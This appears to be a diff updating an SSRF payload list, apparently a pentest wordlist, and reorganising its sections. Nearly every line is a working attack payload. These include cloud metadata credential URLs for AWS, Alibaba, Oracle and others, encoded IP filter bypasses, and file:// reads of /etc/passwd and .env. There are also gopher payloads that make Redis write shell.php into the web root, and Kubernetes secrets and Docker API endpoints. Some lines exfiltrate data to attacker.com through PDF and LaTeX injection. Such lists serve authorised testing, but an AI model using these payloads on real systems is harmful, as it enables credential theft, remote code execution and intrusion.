@@ -1,5 +1,6 @@
 # SSRF Payloads — WebSecure
-# AWS | GCP | Azure | Localhost | IPv6 | Protocol-abuse | DNS-rebinding | CRLF
+# AWS | GCP | Azure | Oracle | AliCloud | OpenStack | IBM | DigitalOcean
+# Localhost | IPv6 | Protocol-abuse | Gopher | URL-confusion | DNS-rebinding | Internal-services
 
 # ── AWS EC2 METADATA ──
 http://169.254.169.254/latest/meta-data/
@@ -19,12 +20,24 @@ http://169.254.169.254/latest/user-data/
 http://169.254.169.254/latest/dynamic/instance-identity/document
 http://169.254.169.254/latest/api/token
 
-# ── AWS ECS METADATA ──
+# ── AWS ECS TASK METADATA ──
 http://169.254.170.2/v2/credentials
 http://169.254.170.2/v2/metadata
 http://169.254.170.2/v2/stats
 http://169.254.170.2/v3/credentials
 http://169.254.170.2/v4/credentials
+
+# ── AWS: 127.0.0.1 NUMERIC VARIANTS ──
+http://2130706433/latest/meta-data/
+http://0x7f000001/latest/meta-data/
+http://017700000001/latest/meta-data/
+http://127.1/latest/meta-data/
+http://0177.0.0.1/latest/meta-data/
+http://0x7f.0x0.0x0.0x1/latest/meta-data/
+http://0177.0000.0000.0001/latest/meta-data/
+http://0xa9fea9fe/latest/meta-data/
+http://0251.0376.0251.0376/latest/meta-data/
+http://00251.000376.00251.000376/latest/meta-data/
 
 # ── GCP METADATA ──
 http://metadata.google.internal/computeMetadata/v1/
@@ -45,17 +58,48 @@ http://169.254.169.254/metadata/scheduledevents?api-version=2019-01-01
 http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
 http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
 
-# ── DIGITAL OCEAN / LINODE METADATA ──
-http://169.254.169.254/metadata/v1.json
+# ── ORACLE CLOUD METADATA ──
+http://169.254.169.254/opc/v1/instance/
+http://169.254.169.254/opc/v1/identity/
+http://169.254.169.254/opc/v2/instance/
+http://169.254.169.254/opc/v1/vnics/
+http://169.254.169.254/opc/v1/volume/attachments/
+
+# ── ALIBABA CLOUD METADATA ──
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/ram-security-credentials/
+http://100.100.100.200/latest/user-data
+http://100.100.100.200/latest/meta-data/hostname
+http://100.100.100.200/latest/meta-data/zone-id
+
+# ── OPENSTACK / RACKSPACE METADATA ──
+http://169.254.169.254/openstack/latest/
+http://169.254.169.254/openstack/latest/meta_data.json
+http://169.254.169.254/openstack/latest/user_data
+http://169.254.169.254/openstack/latest/network_data.json
+http://169.254.169.254/openstack/2017-02-22/meta_data.json
+http://169.254.169.254/openstack/2012-08-10/meta_data.json
+
+# ── IBM CLOUD / DIGITAL OCEAN METADATA ──
 http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/instance/
+http://169.254.169.254/metadata/v1/keys/
+http://169.254.169.254/metadata/v1/iam/
+http://169.254.169.254/metadata/v1.json
 http://169.254.169.254/metadata/v1/account
 http://169.254.169.254/metadata/v1/id
 http://169.254.169.254/metadata/v1/hostname
 http://169.254.169.254/metadata/v1/user-data
-http://192.168.1.1/
-http://10.0.0.1/
 
-# ── LOCALHOST / 127.0.0.1 VARYANTLARİ ──
+# ── SCALEWAY / HETZNER / VULTR METADATA ──
+http://169.254.42.42/conf
+http://169.254.42.42/conf?format=json
+http://169.254.169.254/v1.json
+http://169.254.169.254/2009-04-04/
+http://192.168.1.1/
+
+# ── LOCALHOST / 127.0.0.1 VARIANTS ──
 http://127.0.0.1/
 http://127.0.0.1:80/
 http://127.0.0.1:8080/
@@ -75,50 +119,84 @@ http://localhost:8080/
 http://localhost:8443/
 http://0.0.0.0/
 http://0.0.0.0:80/
-http://[::1]/
-http://[::1]:80/
-http://[::ffff:127.0.0.1]/
-http://[::ffff:7f00:1]/
 http://0177.0.0.1/
 http://2130706433/
 http://0x7f000001/
-http://0x7f.0x0.0x0.0x1/
 http://127.1/
 http://127.0.1/
-http://127.00.00.01/
-http://127.000.000.001/
 http://0:80/
-http://[0:0:0:0:0:0:0:1]/
+http://[::1]/
+http://[::1]:80/
+
+# ── IPv6 VARIANTS ──
+http://[::1]:8080/
+http://[::1]:443/
+http://[::ffff:127.0.0.1]/
+http://[::ffff:7f00:1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[0:0:0:0:0:ffff:7f00:1]/
+http://[::ffff:0:127.0.0.1]/
+http://[::1]/latest/meta-data/
+http://[::ffff:169.254.169.254]/latest/meta-data/
+http://[::ffff:a9fe:a9fe]/latest/meta-data/
+http://[64:ff9b::169.254.169.254]/
 http://[0000::1]/
 
-# ── İÇ AĞ TARAMASI ──
+# ── INTERNAL NETWORK SCAN ──
 http://10.0.0.1/
 http://10.0.0.2/
 http://172.16.0.1/
 http://172.31.0.1/
 http://192.168.0.1/
-http://192.168.1.1/
 http://192.168.100.1/
 http://10.0.0.1:8080/
 http://10.0.0.1:8443/
-http://10.0.0.1:80/
-http://10.0.0.1:443/
 http://10.0.0.1:22/
 http://10.0.0.1:3389/
 
-# ── PROTOKOL KÖTÜYE KULLANIM ──
+# ── INTERNAL SERVICES FINGERPRINTING ──
+http://127.0.0.1:443/
+http://127.0.0.1:9000/
+http://127.0.0.1:9300/
+http://127.0.0.1:2376/
+http://127.0.0.1:5000/
+http://127.0.0.1:5601/
+http://127.0.0.1:8500/
+http://127.0.0.1:8600/
+http://127.0.0.1:2181/
+http://127.0.0.1:9090/
+http://127.0.0.1:10250/
+http://127.0.0.1:10255/
+http://127.0.0.1:2379/
+http://127.0.0.1:4001/
+http://127.0.0.1:4848/
+
+# ── PROTOCOL ABUSE: FILE ──
 file:///etc/passwd
 file:///etc/hosts
 file:///C:/Windows/win.ini
 file:///proc/self/environ
+file:///var/www/html/.env
+
+# ── PROTOCOL ABUSE: DICT ──
 dict://127.0.0.1:6379/info
 dict://127.0.0.1:6379/CONFIG GET *
 dict://127.0.0.1:11211/stats
 dict://127.0.0.1:3306/
+
+# ── PROTOCOL ABUSE: GOPHER (Redis RCE) ──
 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
 gopher://127.0.0.1:6379/_%2A2%0D%0A%244%0D%0Ainfo%0D%0A%240%0D%0A%0D%0A
-gopher://127.0.0.1:3306/
+gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0ASET%0D%0A$1%0D%0Ax%0D%0A$1%0D%0Ay%0D%0A
+gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A
+gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$10%0D%0Adbfilename%0D%0A$8%0D%0Ashell.php%0D%0A
+gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0ASAVE%0D%0A
+
+# ── PROTOCOL ABUSE: GOPHER SMTP ──
+gopher://127.0.0.1:25/_EHLO%20localhost%0D%0AMAIL%20FROM%3A%3Cattacker%40attacker.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40victim.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%20Test%0D%0A%0D%0ASSRF%20via%20gopher%0D%0A.%0D%0AQUIT%0D%0A
 gopher://127.0.0.1:25/_EHLO%20localhost
+
+# ── PROTOCOL ABUSE: MISC ──
 sftp://attacker.com:1234/
 tftp://attacker.com:1234/test.txt
 ldap://attacker.com:1234/
@@ -126,8 +204,10 @@ ldaps://attacker.com:1234/
 smb://attacker.com:1234/
 jar:http://attacker.com/test.jar!/
 netdoc:///etc/passwd
+ftp://127.0.0.1:21/
+ftp://anonymous:anonymous@127.0.0.1/
 
-# ── URL PARSER KARIŞIKLIĞI ──
+# ── URL PARSER CONFUSION ──
 http://attacker.com@169.254.169.254/
 http://169.254.169.254#.attacker.com
 http://169.254.169.254?.attacker.com
@@ -143,11 +223,39 @@ http://169.254.169.254:80/
 http://169.254.169.254:443/
 http://169.254.169.254/./meta-data/
 http://169.254.169.254/%2e/meta-data/
+http://169.254.169.254/latest/meta-data#@attacker.com/
+http://169.254.169.254/latest/meta-data?@attacker.com/
+http://attacker.com%2540169.254.169.254/
+http://169.254.169.254%09/
+http://169.254.169.254%0a/
+http://169.254.169.254%0d/
+http://169.254.169.254%20/
+http://169.254.169.254%00/
+http://[0:0:0:0:0:ffff:a9fe:a9fe]/
+http://169.254.169.254:443/../latest/meta-data/
+http://0x0a0000fe/latest/meta-data/
 
-# ── DNS REBINDING / OOB ──
+# ── URL ENCODING BYPASS ──
+http://169.254.169.254%2Flatest%2Fmeta-data%2F
+http://169.254.169.254%2Flatest/meta-data/
+http://%31%36%39%2E%32%35%34%2E%31%36%39%2E%32%35%34/latest/meta-data/
+http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/
+http://0xA9FEA9FE/latest/meta-data/
+http://2852039166/latest/meta-data/
+
+# ── DNS REBINDING PAYLOADS ──
+http://rebind.attacker.com/
+http://make-169.254.169.254.attacker.com.nip.io/
+http://169.254.169.254.xip.io/latest/meta-data/
+http://169.254.169.254.nip.io/latest/meta-data/
+http://169.254.169.254.sslip.io/latest/meta-data/
+http://time.169.254.169.254.rebind.network/latest/meta-data/
+http://rbndr.us/169.254.169.254/latest/meta-data/
 http://169.254.169.254.attacker.com/
 http://1ocalhost/
 http://localh0st/
+
+# ── DNS REBINDING: TIMING-BASED ──
 http://169＠254＠169＠254/meta-data/
 http://0251.0376.0251.0376/meta-data/
 http://℃169.254.169.254/
@@ -161,133 +269,60 @@ http://127.0.0.1:25/%0D%0AHELO%20attacker.com%0D%0A
 http://kubernetes.default.svc/
 http://kubernetes.default.svc/api/v1/
 http://kubernetes.default.svc/api/v1/secrets/
+http://kubernetes.default.svc/api/v1/namespaces/default/secrets/
 http://kubernetes.default.svc.cluster.local/
 http://10.0.0.1:10255/pods
 http://10.0.0.1:10255/metrics
-http://10.0.0.1:8080/
 http://etcd.kube-system.svc:2379/v2/keys/
-http://169.254.169.254/openstack/latest/
+http://127.0.0.1:2375/v1.43/containers/json
+http://127.0.0.1:2375/v1.43/images/json
+http://127.0.0.1:2376/containers/json
+http://127.0.0.1:4243/containers/json
 
-# ── AWS: 127.0.0.1 VARIANTS (decimal/octal/hex) ──
-http://2130706433/latest/meta-data/
-http://0x7f000001/latest/meta-data/
-http://017700000001/latest/meta-data/
-http://127.0.0.1/latest/meta-data/
-http://127.1/latest/meta-data/
-http://0177.0.0.1/latest/meta-data/
-http://00000177.0.0.1/latest/meta-data/
-http://0x7f.0x0.0x0.0x1/latest/meta-data/
-http://0177.0000.0000.0001/latest/meta-data/
+# ── SSRF VIA INTERNAL SERVICES ──
+http://127.0.0.1:9200/_cat/indices
+http://127.0.0.1:9200/_nodes
+http://127.0.0.1:9200/_cluster/health
+http://127.0.0.1:5601/api/status
+http://127.0.0.1:8500/v1/catalog/services
+http://127.0.0.1:8500/v1/agent/self
+http://127.0.0.1:2379/v2/keys/
+http://127.0.0.1:4001/v2/keys/
+http://127.0.0.1:9090/api/v1/targets
 
-# ── IPv6 VARIANTS ──
-http://[::1]/
-http://[::1]:80/
-http://[::1]:8080/
-http://[::1]:443/
-http://[::ffff:127.0.0.1]/
-http://[::ffff:7f00:1]/
-http://[0:0:0:0:0:ffff:127.0.0.1]/
-http://[0:0:0:0:0:ffff:7f00:1]/
-http://[::ffff:0:127.0.0.1]/
-http://[::1]/latest/meta-data/
-http://[::ffff:169.254.169.254]/latest/meta-data/
-http://[::ffff:a9fe:a9fe]/latest/meta-data/
-http://[64:ff9b::169.254.169.254]/
+# ── SSRF TO INTERNAL GRAPHQL ──
+http://127.0.0.1:4000/graphql?query={__schema{types{name}}}
+http://127.0.0.1:8080/graphql?query={users{id,username,email,password}}
+http://localhost:4000/api/graphql
 
-# ── PROTOCOL ABUSE: GOPHER REDIS ──
-gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
-gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0ASET%0D%0A$1%0D%0Ax%0D%0A$1%0D%0Ay%0D%0A
-gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A
-gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$10%0D%0Adbfilename%0D%0A$8%0D%0Ashell.php%0D%0A
-gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0ASAVE%0D%0A
+# ── SSRF TO INTERNAL REDIS ──
+dict://127.0.0.1:6379/PING
+dict://127.0.0.1:6379/KEYS *
+dict://127.0.0.1:6379/CONFIG GET requirepass
 
-# ── PROTOCOL ABUSE: GOPHER SMTP ──
-gopher://127.0.0.1:25/_EHLO%20localhost%0D%0AMAIL%20FROM%3A%3Cattacker%40attacker.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40victim.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%20Test%0D%0A%0D%0ASSRF%20via%20gopher%0D%0A.%0D%0AQUIT%0D%0A
-
-# ── PROTOCOL ABUSE: FTP ──
-ftp://127.0.0.1:21/
-ftp://anonymous:anonymous@127.0.0.1/
-ftp://attacker.com:21/
-ftp://attacker.com/
-
-# ── URL PARSER CONFUSION EXTENDED ──
-http://169.254.169.254/latest/meta-data#@attacker.com/
-http://169.254.169.254/latest/meta-data?@attacker.com/
-http://attacker.com%2540169.254.169.254/
-http://attacker.com%25%32%35%32%35169.254.169.254/
-http://169.254.169.254%2F.attacker.com/
-http://attacker.com/..%2F..%2F169.254.169.254/
-http://169.254.169.254%09/
-http://169.254.169.254%0a/
-http://169.254.169.254%0d/
-http://169.254.169.254%20/
-http://169.254.169.254%00/
-http://[0:0:0:0:0:ffff:a9fe:a9fe]/
-http://169.254.169.254:443/../latest/meta-data/
-http://0x0a0000fe/latest/meta-data/
-
-# ── DNS REBINDING PAYLOADS ──
-http://rebind.attacker.com/
-http://make-169.254.169.254.attacker.com.nip.io/
-http://169.254.169.254.xip.io/latest/meta-data/
-http://169.254.169.254.nip.io/latest/meta-data/
-http://169.254.169.254.sslip.io/latest/meta-data/
-http://time.169.254.169.254.rebind.network/latest/meta-data/
-http://rbndr.us/169.254.169.254/latest/meta-data/
-
-# ── CLOUD: ALI CLOUD METADATA ──
-http://100.100.100.200/latest/meta-data/
-http://100.100.100.200/latest/meta-data/instance-id
-http://100.100.100.200/latest/meta-data/ram-security-credentials/
-http://100.100.100.200/latest/user-data
-
-# ── CLOUD: OPENSTACK METADATA ──
-http://169.254.169.254/openstack/latest/
-http://169.254.169.254/openstack/latest/meta_data.json
-http://169.254.169.254/openstack/latest/user_data
-http://169.254.169.254/openstack/latest/network_data.json
-http://169.254.169.254/openstack/2017-02-22/meta_data.json
-http://169.254.169.254/openstack/2012-08-10/meta_data.json
-
-# ── CLOUD: IBM CLOUD METADATA ──
-http://169.254.169.254/metadata/v1/
-http://169.254.169.254/metadata/v1/instance/
-http://169.254.169.254/metadata/v1/keys/
-http://169.254.169.254/metadata/v1/iam/
-
-# ── INTERNAL SERVICES FINGERPRINTING ──
-http://127.0.0.1:80/
-http://127.0.0.1:443/
-http://127.0.0.1:8080/
-http://127.0.0.1:8443/
-http://127.0.0.1:9000/
-http://127.0.0.1:9200/
-http://127.0.0.1:9300/
-http://127.0.0.1:6379/
-http://127.0.0.1:3306/
-http://127.0.0.1:5432/
-http://127.0.0.1:27017/
-http://127.0.0.1:11211/
-http://127.0.0.1:2375/
-http://127.0.0.1:2376/
-http://127.0.0.1:4243/
-http://127.0.0.1:5000/
-http://127.0.0.1:5601/
-http://127.0.0.1:8500/
-http://127.0.0.1:8600/
-http://127.0.0.1:2181/
-http://127.0.0.1:4848/
-http://127.0.0.1:8888/
-http://127.0.0.1:9090/
-http://127.0.0.1:10250/
-http://127.0.0.1:10255/
-http://127.0.0.1:2379/
-http://127.0.0.1:4001/
+# ── SSRF TO INTERNAL MEMCACHED ──
+dict://127.0.0.1:11211/version
 
 # ── SSRF VIA REDIRECT ──
 http://attacker.com/redirect?url=http://169.254.169.254/
 https://attacker.com/r?u=http://127.0.0.1/admin
 http://attacker.com/301?to=http://169.254.169.254/latest/meta-data/
+
+# ── SSRF VIA WEBSOCKET UPGRADE ──
+ws://127.0.0.1:6379/
+ws://127.0.0.1:8080/
+Upgrade: websocket
+Connection: Upgrade
+
+# ── SSRF VIA PDF RENDERING ──
+<iframe src="file:///etc/passwd">
+<img src="http://169.254.169.254/latest/meta-data/">
+<link rel="stylesheet" href="http://attacker.com/steal?x=
+
+# ── SSRF VIA LaTeX ──
+\input{/etc/passwd}
+\include{/etc/passwd}
+\url{http://attacker.com/?x=}
 
 # ── SSRF VIA HEADERS ──
 X-Forwarded-For: 169.254.169.254
@@ -296,13 +331,4 @@ X-Custom-IP-Authorization: 127.0.0.1
 X-Forwarded-Host: 169.254.169.254
 X-Original-URL: /admin
 X-Rewrite-URL: /admin
-
-# ── BYPASS: ENCODING TRICKS ──
-http://169.254.169.254%2Flatest%2Fmeta-data%2F
-http://169.254.169.254%2Flatest/meta-data/
-http://%31%36%39%2E%32%35%34%2E%31%36%39%2E%32%35%34/latest/meta-data/
-http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/
-http://0xA9FEA9FE/latest/meta-data/
-http://2852039166/latest/meta-data/
-http://0251.0376.0251.0376/latest/meta-data/
-http://00251.000376.00251.000376/latest/meta-data/
+Host: 169.254.169.254
